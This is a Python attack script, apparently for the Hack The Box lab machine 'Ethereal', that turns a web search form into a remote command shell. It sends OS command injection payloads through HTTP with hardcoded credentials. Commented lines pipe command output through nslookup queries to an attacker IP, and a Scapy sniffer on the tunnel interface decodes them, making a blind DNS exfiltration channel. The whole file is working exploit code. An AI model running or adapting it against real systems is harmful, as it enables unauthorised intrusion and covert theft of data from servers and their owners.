from scapy.all import *
from threading import Thread
from time import sleep
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from cmd import Cmd

class Terminal(Cmd):
    prompt=">"
    def __init__(self):
        self.auth=HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
        page=requests.get('http://ethereal.htb:8080',auth=self.auth)
        soup=BeautifulSoup(page.text,'html.parser')
        self.vs=soup.find('input',{'name':'__VIEWSTATE'})['value']
        self.vsg=soup.find('input',{'name':'__VIEWSTATEGENERATOR'})['value']
        self.ev=soup.find('input',{'name':'__EVENTVALIDATION'})['value']
        self.ctl=soup.find('input',{'name':'ctl02'})['value']
        Cmd.__init__(self)
       # print(self.vs+"  "+self.vsg+" "+self.ev+" "+self.ctl)

    def default(self,args):
        cmd=f"""-n 1 127.0.0.1 && start cmd /c "{args}"""
        #cmd=f"""-n 1 127.0.0.1 & for /f "tokens=1-26 " %a in ('cmd /c "{args}"') do nslookup Q%aZ.Q%bZ.Q%cZ.Q%dZ.Q%eZ.Q%fZ.Q%gZ.Q%hZ.Q%iZ.Q%jZ.Q%kZ.Q%lZ.Q%mZ.Q%nZ.Q%oZ.Q%pZ.Q%qZ.Q%rZ.Q%sZ.Q%tZ.Q%uZ.Q%vZ.Q%wZ.Q%xZ.Q%yZ.Q%zZ. 10.10.14.16""" 
        #cmd="-n 1 127.0.0.1 && nslookup gg 10.10.14.16"
        data={'__VIEWSTATE':self.vs, '__VIEWSTATEGENERATOR':self.vsg,'__EVENTVALIDATION':self.ev,'search':cmd,'ctl02':self.ctl}
        requests.post('http://ethereal.htb:8080',data=data,auth=self.auth)

    def do_cmd(selfs,args):
       print(args)

class Sniffer(Thread):
    def  __init__(self, interface="tun0"):
        super().__init__()
        self.interface = interface

    def run(self):
        sniff(iface=self.interface, filter="ip", prn=self.print_packet)

    def print_packet(self, packet):
        if(packet.haslayer(DNS)):
            if packet.dport == 53:
                qname=(packet.qd.qname).decode("utf-8")
                qtype=(packet.qd.qtype)
                if qtype==1:
                    print(qname[1:-2].replace("Z.Q"," ").strip())
sniffer = Sniffer()
sniffer.start()
terminal=Terminal()
terminal.cmdloop()

